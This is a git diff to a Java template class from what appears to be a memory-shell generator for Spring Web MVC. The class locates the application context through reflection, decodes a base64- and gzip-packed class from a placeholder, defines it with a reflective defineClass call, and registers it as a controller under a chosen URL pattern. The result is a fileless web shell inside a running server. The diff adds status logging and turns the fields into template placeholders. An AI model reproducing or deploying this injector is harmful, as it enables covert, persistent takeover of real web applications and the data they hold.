@@ -3,6 +3,7 @@ package org.leo.jmg.mem.injectortpl.springwebmvc;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.Map;
@@ -10,17 +11,24 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  * @since 2024/12/22
  */
 public class SpringWebMvcControllerHandlerInjector {
-    
-    private static boolean ok;
 
-    private static String shellClassName;
-    private static String shellClass;
-    private static String urlPattern;
+    private static String msg = "";
+    private static boolean ok = false;
 
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public SpringWebMvcControllerHandlerInjector() {
         if (ok) {
@@ -30,24 +38,25 @@ public class SpringWebMvcControllerHandlerInjector {
         try {
             context = getContext();
         } catch (Throwable e) {
-          
+            msg += "context error: " + getErrorMessage(e);
         }
-        if (context != null) {
+        if (context == null) {
+            msg += "context not found";
+        } else {
             try {
                 Object shell = getShell();
-                
+                msg += "context: [" + context + "] ";
                 inject(context, shell);
-                
+                msg += "[" + getUrlPattern() + "] ready\n";
             } catch (Throwable e) {
-                
+                msg += "failed " + getErrorMessage(e) + "\n";
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
-        urlPattern = null;
+        System.out.println(msg);
     }
 
+    @SuppressWarnings("unchecked")
     public Object getContext() throws Exception {
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         try {
@@ -68,9 +77,9 @@ public class SpringWebMvcControllerHandlerInjector {
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         Object interceptor = null;
         try {
-            interceptor = classLoader.loadClass(shellClassName).newInstance();
+            interceptor = classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
@@ -79,6 +88,7 @@ public class SpringWebMvcControllerHandlerInjector {
         return interceptor;
     }
 
+    @SuppressWarnings("unchecked")
     public void inject(Object context, Object controller) throws Exception {
         Class<?> beanNameUrlHandlerMappingClass = null;
         try {
@@ -88,21 +98,24 @@ public class SpringWebMvcControllerHandlerInjector {
         }
         Object beanNameUrlHandlerMapping = invokeMethod(context, "getBean", new Class[]{Class.class}, new Object[]{beanNameUrlHandlerMappingClass});
         Map<String, Object> handlerMap = (Map<String, Object>) getFieldValue(beanNameUrlHandlerMapping, "handlerMap");
-        if (handlerMap.get(urlPattern) != null) {
+        if (handlerMap.get(getUrlPattern()) != null) {
             return;
         }
-        handlerMap.put(urlPattern, controller);
+        handlerMap.put(getUrlPattern(), controller);
     }
 
+    @Override
+    public String toString() {
+        return msg;
+    }
 
-
-    
+    @SuppressWarnings("all")
     public static Object invokeMethod(Object obj, String methodName) throws
             Exception {
         return invokeMethod(obj, methodName, new Class[0], new Object[0]);
     }
 
-    
+    @SuppressWarnings("all")
     public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws
             Exception {
         Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
@@ -125,7 +138,7 @@ public class SpringWebMvcControllerHandlerInjector {
         return method.invoke(obj instanceof Class ? null : obj, param);
     }
 
-    
+    @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
         Class<?> decoderClass;
         try {
@@ -138,7 +151,7 @@ public class SpringWebMvcControllerHandlerInjector {
         }
     }
 
-    
+    @SuppressWarnings("all")
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
@@ -162,7 +175,7 @@ public class SpringWebMvcControllerHandlerInjector {
         return out.toByteArray();
     }
 
-    
+    @SuppressWarnings("all")
     public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
         for (Class<?> clazz = obj.getClass();
              clazz != Object.class;
@@ -177,7 +190,7 @@ public class SpringWebMvcControllerHandlerInjector {
     }
 
 
-    
+    @SuppressWarnings("all")
     public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
         try {
             Field field = getField(obj, name);
@@ -188,5 +201,18 @@ public class SpringWebMvcControllerHandlerInjector {
         return null;
     }
 
-
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
